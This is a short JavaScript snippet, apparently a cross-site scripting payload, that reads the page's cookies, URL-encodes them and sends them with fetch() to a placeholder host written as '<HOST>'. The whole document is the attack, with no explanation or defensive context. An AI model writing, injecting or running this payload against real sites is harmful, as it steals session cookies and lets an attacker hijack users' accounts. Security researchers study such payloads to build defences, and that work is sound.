let cookie = document.cookie

let encoded_cookie = encodeURIComponent(cookie)

fetch("http://<HOST>/?cookies=" + encoded_cookie)
